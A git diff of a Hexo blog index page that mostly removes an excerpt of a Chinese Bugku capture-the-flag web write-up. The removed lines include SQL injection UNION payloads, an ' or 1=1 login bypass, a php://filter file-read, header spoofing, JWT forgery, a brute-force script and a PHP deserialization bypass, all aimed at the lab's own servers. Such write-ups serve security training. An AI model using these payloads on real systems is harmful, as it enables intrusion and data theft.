@@ -17,7 +17,7 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
   <meta property="og:type" content="website">
@@ -113,6 +113,16 @@
     <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
         <li class="menu-item menu-item-archives">
 
     <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
@@ -187,6 +197,14 @@
           <p>test<br>test</p>
 <p><img src="%5Cimages%5Cpasted-0.png%5C" alt="upload successful"></p>
 
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/09/11/est/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -258,138 +276,14 @@
 
 <h2 id="web3-php伪协议"><a href="#web3-php伪协议" class="headerlink" title="web3 php伪协议"></a>web3 <code>php伪协议</code></h2><p>根据 op 后的传不同的值返回不同页面，可能存在文件包含</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.31.85:10003/?op=f   返回Error  no such page</span><br><span class="line">http://123.206.31.85:10003/?op=flag  返回正常 即存在flag页面</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?op=php://filter/read=convert.base64-encode/resource=flag  base64解码后即可得到flag</span><br></pre></td></tr></table></figure>
-
-<h2 id="web4-万能密码"><a href="#web4-万能密码" class="headerlink" title="web4  万能密码"></a>web4  万能密码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">万能密码登录    &#x27; or 1=1 #  在用户名和密码输入均可</span><br></pre></td></tr></table></figure>
-
-<h2 id="web5-sql注入"><a href="#web5-sql注入" class="headerlink" title="web5  sql注入"></a>web5  sql注入</h2><p>url/?mod=read&amp;id=1   id 是注入点   </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://47.95.208.167:10005/?mod=read&amp;id=-1 union select 1,2,3,group_concat(table_name)  from information_schema.tables where table_schema=database() %23</span><br><span class="line"></span><br><span class="line">http://47.95.208.167:10005/?mod=read&amp;id=-1 union select 1,2,3, group_concat(column_name)  from information_schema.columns where table_schema=database() and table_name= &#x27;flag&#x27; %23</span><br><span class="line"></span><br><span class="line">http://47.95.208.167:10005/?mod=read&amp;id=-1 union select 1,2,3, flag from flag %23</span><br></pre></td></tr></table></figure>
-
-<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>查看源代码注意到右面滑条 ，于是拉倒低端，发现一串字符   <code>&lt;!-- dGVzdDEyMw== --&gt;</code>  base64解密之后  <code>test123</code>  在根据<strong>提示只允许本地管理员</strong>登录 尝试  admin   test123   并修改访问头   添加   </p>
-<p><strong>X-Forwarded-For: 127.0.0.1</strong></p>
-<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujbyg6tj30dy07h3yo.jpg"></p>
-<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujbytfqj30x70c040l.jpg"></p>
-<h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>根据题目提示 与cookies有关  输入admin   admin  成功进去（随意注册一个也行）刷新抓包</p>
-<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujbzomfj30dv01k0so.jpg"></p>
-<p>cookies中，u和r的值只有后面不一样，截取不一样的部分进行MD5解密</p>
-<p><strong>u后面的值解密</strong></p>
-<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujc6xiij30pw06qglp.jpg"></p>
-<p><strong>r后面MD5 解密后</strong></p>
-<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujc1akxj30t309z74u.jpg"></p>
-<p>在bp里面将r的值替换为u的值提交发包即可得到flag</p>
-<h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>提示是SQL注入   </p>
-<p>找注入点，由于age是数字型 不用考虑引号闭合，尝试注入  ，表单提交验证在update.php (抓包的时候就可以发现)，每次操作都要更新一下taken值 (审查元素即可得到taken )，每次的返回值也要去审查元素里面找</p>
-<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujc57tjj30w008q0tt.jpg"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nickname=Lamber%27123&amp;age=(select group_concat(schema_name) from information_schema.schemata)&amp;description=users213213&amp;token=8df7c9a1ddabfc6f8b5e9a42571656b9</span><br><span class="line"># 得到information_schema,web8</span><br><span class="line"></span><br><span class="line">nickname=Lamber%27123&amp;age=(select group_concat(table_name) from information_schema.tables where table_schema=database())&amp;description=users213213&amp;token=0b22b45bcea23019fb75625fbcbabefd</span><br><span class="line">#得到一张表  users</span><br><span class="line"></span><br><span class="line">nickname=Lamber%27123&amp;age=(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273)&amp;description=users213213&amp;token=4ac637c081b03611c0fed94a0282974d</span><br><span class="line">#所有列  id,username,password,nickname,age,description</span><br><span class="line"></span><br><span class="line">nickname=Lamber%27123&amp;age=(select group_concat(username) from (select * from users )x)&amp;description=users213213&amp;token=250faaa4f220ddfb3fed6a8213160014</span><br><span class="line"># 逐一查看列值 无flag        我做的时候题被谁改了 emmmmmmm </span><br><span class="line">搜索网上其他的wp，本来应该在description 这一列的</span><br></pre></td></tr></table></figure>
-
-<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>如图</p>
-<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujc7zo9j30oo06yt99.jpg"> </p>
-<p>将返回的值base64解密即可</p>
-<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>进入后 ，查看源码得到 <code>&lt;!--hint:NNVTU23LGEZDG===--&gt; </code> base64解密后  kk ： kk123  登陆</p>
-<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujcdz7jj30ek08vmx3.jpg"></p>
-<p>根据提示（vim异常退出会临时保存文件）存在文件泄露，这个可以直接查看网站目录 </p>
-<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujcev61j30hb07tjrr.jpg"></p>
-<p>下载L3yx.php.swp  在Linux里面还原文件得到源码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;</span><br><span class="line">&lt;title&gt;在线日记本&lt;/title&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">  &lt;p&gt;username: &lt;input type=&quot;text&quot; name=&quot;username&quot; /&gt;&lt;/p&gt;</span><br><span class="line">  &lt;p&gt;password: &lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;&lt;/p&gt;</span><br><span class="line">  &lt;input type=&quot;submit&quot; value=&quot;login&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;!--hint:NNVTU23LGEZDG===--&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require_once &#x27;src/JWT.php&#x27;;</span><br><span class="line"></span><br><span class="line">    const KEY = &#x27;L3yx----++++----&#x27;;</span><br><span class="line"></span><br><span class="line">    function loginkk()</span><br><span class="line">    &#123;</span><br><span class="line">        $time = time();</span><br><span class="line">        $token = [</span><br><span class="line">          &#x27;iss&#x27;=&gt;&#x27;L3yx&#x27;,</span><br><span class="line">          &#x27;iat&#x27;=&gt;$time,</span><br><span class="line">          &#x27;exp&#x27;=&gt;$time+5,</span><br><span class="line">          &#x27;account&#x27;=&gt;&#x27;kk&#x27;</span><br><span class="line">        ];</span><br><span class="line">        $jwt = \Firebase\JWT\JWT::encode($token,KEY);</span><br><span class="line">        setcookie(&quot;token&quot;,$jwt);</span><br><span class="line">        header(&quot;location:user.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(isset($_POST[&#x27;username&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]) &amp;&amp; $_POST[&#x27;username&#x27;]!=&#x27;&#x27; &amp;&amp; $_POST[&#x27;password&#x27;]!=&#x27;&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        if($_POST[&#x27;username&#x27;]==&#x27;kk&#x27; &amp;&amp; $_POST[&#x27;password&#x27;]==&#x27;kk123&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            loginkk();</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            echo &quot;账号或密码错误&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-
-<p>到这里</p>
-<p><a href="NEW-bugku-writeup/https://learnku.com/articles/10885/full-use-of-jwt#b363e1">记得先了解一下jwt是什么再做题</a></p>
-<p><a href="NEW-bugku-writeup/https://tool.lu/timestamp/">linux时间戳在线转化</a>  </p>
-<p>每次的登录后，就验证有效期就5秒，登录后就立即刷新留言页面  用bp抓包，进行jwt伪造</p>
-<p><img src="NEW-bugku-writeup/web6_1.jpg"></p>
-<p>将上方框起来的复制到下面  这个<a href="NEW-bugku-writeup/https://jwt.io/">网站</a>在线进行jwt还原</p>
-<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujcggwij30py0ejjtj.jpg" alt="1557568439650"></p>
-<p>粘贴到bp里，到预定的时间提交就行了</p>
-<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujcfig2j313m09tdhd.jpg"></p>
-<h2 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h2><p>进去之后看到 网站标题是robots 之间进 robots.txt 查看  给出一个页面吧地址   /shell.php</p>
-<p><img src="NEW-bugku-writeup/006aU7c6ly1g2v62xse87j30ku06h0t5.jpg" alt="1557580412161"></p>
-<p>直接上脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">url = &#x27;http://123.206.31.85:3030/shell.php&#x27;</span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(url)</span><br><span class="line">res = r.text.encode(r.encoding).decode()</span><br><span class="line"></span><br><span class="line">a = res.find(&#x27;) =&#x27;)#获取目标位置的位置</span><br><span class="line">b = res.find(&#x27;&lt;&#x27;, a)</span><br><span class="line">res_md5 = res[a+4:b]#截取获得md5字符串</span><br><span class="line">#print(res_md5)</span><br><span class="line">for i in range(100000000000):</span><br><span class="line">    str_md5 = hashlib.md5(str(i).encode(encoding=&#x27;utf-8&#x27;)).hexdigest()</span><br><span class="line">    if str_md5[:6] == res_md5:</span><br><span class="line">        url = &quot;http://123.206.31.85:3030/shell.php?password=&#123;&#125;&quot;.format(i)</span><br><span class="line">        r = s.get(url)</span><br><span class="line">        print(r.text)</span><br><span class="line">        break</span><br><span class="line">        #print(i)</span><br><span class="line">#运行即可得到flag       </span><br><span class="line">#flag&#123;e2f86fb5f7********f4957d89aaca0&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h2><p>查看源码，php反序列化，另外还有绕过wakeup() </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">class Time&#123;</span><br><span class="line">	public $flag = ******************;</span><br><span class="line">	public $truepassword = ******************;</span><br><span class="line">	public $time;</span><br><span class="line">	public $password ;</span><br><span class="line">	public function __construct($tt, $pp) &#123;</span><br><span class="line">    $this-&gt;time = $tt;</span><br><span class="line">    $this-&gt;password = $pp;</span><br><span class="line">    &#125;</span><br><span class="line">	function __destruct()&#123;</span><br><span class="line">		if(!empty($this-&gt;password))</span><br><span class="line">		&#123;</span><br><span class="line">			if(strcmp($this-&gt;password,$this-&gt;truepassword)==0)&#123;</span><br><span class="line">				echo &quot;&lt;h1&gt;Welcome,you need to wait......&lt;br&gt;The flag will become soon....&lt;/h1&gt;&lt;br&gt;&quot;;</span><br><span class="line">				if(!empty($this-&gt;time))&#123;</span><br><span class="line">					if(!is_numeric($this-&gt;time))&#123;</span><br><span class="line">						echo &#x27;Sorry.&lt;br&gt;&#x27;;</span><br><span class="line">						show_source(__FILE__);</span><br><span class="line">					&#125;</span><br><span class="line">					else if($this-&gt;time &lt; 11 * 22 * 33 * 44 * 55 * 66)&#123;</span><br><span class="line">						echo &#x27;you need a bigger time.&lt;br&gt;&#x27;;</span><br><span class="line">					&#125;</span><br><span class="line">					else if($this-&gt;time &gt; 66 * 55 * 44 * 33 * 23 * 11)&#123;</span><br><span class="line">						echo &#x27;you need a smaller time.&lt;br&gt;&#x27;;</span><br><span class="line">					&#125;</span><br><span class="line">					else&#123;</span><br><span class="line">						sleep((int)$this-&gt;time);</span><br><span class="line">						var_dump($this-&gt;flag);</span><br><span class="line">					&#125;</span><br><span class="line">					echo &#x27;&lt;hr&gt;&#x27;;</span><br><span class="line">				&#125;</span><br><span class="line">				else&#123;</span><br><span class="line">					echo &#x27;&lt;h1&gt;you have no time!!!!!&lt;/h1&gt;&lt;br&gt;&#x27;;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				echo &#x27;&lt;h1&gt;Password is wrong............&lt;/h1&gt;&lt;br&gt;&#x27;;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			echo &quot;&lt;h1&gt;Please input password..........&lt;/h1&gt;&lt;br&gt;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	function __wakeup()&#123;</span><br><span class="line">		$this-&gt;password = 1; echo &#x27;hello hacker,I have changed your password and time, rua!&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;rua&#x27;]))&#123;</span><br><span class="line">	$rua = $_GET[&#x27;rua&#x27;];</span><br><span class="line">	@unserialize($rua);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	echo &quot;&lt;h1&gt;Please don&#x27;t stop rua 233333&lt;/h1&gt;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">--!&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>绕过时间 16进制绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a=11 * 22 * 33 * 44 * 55 * 66</span><br><span class="line">b=66 * 55 * 44 * 33 * 23 * 11</span><br><span class="line"></span><br><span class="line">c=hex(a+1)</span><br><span class="line">print(c)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>反序列化</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Time &#123;</span><br><span class="line"></span><br><span class="line">	public $time;</span><br><span class="line">	public $password;</span><br><span class="line">	public function __construct($tt, $pp) &#123;</span><br><span class="line">		$this-&gt;time = $tt;</span><br><span class="line">		$this-&gt;password = $pp;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$password = array(&#x27;er&#x27;);</span><br><span class="line">$time = &#x27;0x4c06f351&#x27;;</span><br><span class="line">$er = new Time($time, $password);</span><br><span class="line">echo serialize($er);</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">///O:4:&quot;Time&quot;:2:&#123;s:4:&quot;time&quot;;s:10:&quot;0x4c06f351&quot;;s:8:&quot;password&quot;;a:1:&#123;i:0;s:2:&quot;er&quot;;&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>绕过wakeup  绕过wakeup()是个cve自行百度了解</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Time&quot;:3:&#123;s:4:&quot;time&quot;;s:10:&quot;0x4c06f351&quot;;s:8:&quot;password&quot;;a:1:&#123;i:0;s:2:&quot;er&quot;;&#125;&#125;</span><br><span class="line">改变了传入的参数的个数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>考察观察能力吧 右键似乎不能查看源码   随意输入提交抓包，在repeater重发 </p>
-<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujbfn32j312o0ar0un.jpg"></p>
-<p>在返回结果的头部信息有password，hint。password base64解密 是flag{4fab4fe94a240242fe567a2421722b97} 去提交果然不对，吧flag{}里的作为密码提交</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Pragma: no-cache</span><br><span class="line">Password: ZmxhZ3s2OGMwOTA2OGJlMjFiNTdkMDlkODQyMGM4NjBjNzJlZX0=</span><br><span class="line">Hint: Seeing is not believing, maybe you need to be faster!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>返回说我太慢，然后上脚本</p>
-<p><img src="NEW-bugku-writeup/006aU7c6ly1g2yujbgyotj30df04fwec.jpg" alt="1557581487844"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">url = &quot;http://123.206.31.85:10013/index.php&quot;</span><br><span class="line"># pwd = &#x27;69ca7eed78620041ba5a14deb44d29d8&#x27;天真的以为这个不变(*/ω＼*)</span><br><span class="line">r = requests.session()</span><br><span class="line"></span><br><span class="line">res = r.post(url, data=&#123;&#x27;password&#x27;: &quot;123&quot;&#125;)</span><br><span class="line">#print(res)</span><br><span class="line">pwd = res.headers[&#x27;Password&#x27;]</span><br><span class="line">#print(&#x27;****&#x27;, pwd)</span><br><span class="line"></span><br><span class="line">pwd = str(base64.b64decode(pwd))[7:-2]</span><br><span class="line">#print(&quot;**&quot;, pwd)</span><br><span class="line"></span><br><span class="line">res = r.post(url, data=&#123;&#x27;password&#x27;: pwd&#125;)</span><br><span class="line"></span><br><span class="line">print(res.text)</span><br><span class="line"></span><br><span class="line">#flag&#123;FjXAkdGn*********jInY2VndLSg&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p>源码泄露 用GITHACK 脚本 跑一下就行了，得到两个文件，其中一个即为flag.php</p>
-<h2 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h2><p>根据提示想到文件泄露，，用工具扫到 存在 index.php~   (工具在gayhub  搜索SourceleakHacker)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span><br><span class="line">include &#x27;./flag.php&#x27;;</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(empty($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line">    header(&#x27;location:./1ndex.php&#x27;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">	if (!is_numeric($id)) &#123;</span><br><span class="line">		$id = intval($id);             //当id为字母时，id=0</span><br><span class="line">		switch ($id) &#123;                  //id=0 时当判断为假时进入</span><br><span class="line">			case $id&gt;=0:</span><br><span class="line">				echo &quot;快出去吧，走错路了～～～&lt;br&gt;&quot;;</span><br><span class="line">				echo &quot;这么简单都不会么？&quot;;</span><br><span class="line">				break;</span><br><span class="line">			case $id&gt;=10:</span><br><span class="line">				exit($flag);</span><br><span class="line">				break;</span><br><span class="line">			default:</span><br><span class="line">				echo &quot;你走不到这一步的!&quot;;</span><br><span class="line">				break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>当id 为任意字符都可以  而且提交页面是 index.php</p>
-<h2 id="web16-待续…"><a href="#web16-待续…" class="headerlink" title="web16 待续…."></a>web16 待续….</h2><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><p>直接查看tcp流就可以看到，简单到难以相信  </p>
-<h2 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h2><p>里面有一段是盲注的请求 ，把后面的16进制的值 转成字符串就行了                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               </p>
-<h2 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h2><p><a target="_blank" rel="noopener" href="http://123.206.31.85:10018/list.php?id=1">http://123.206.31.85:10018/list.php?id=1</a>     改变id值返回不同页面，测试注入</p>
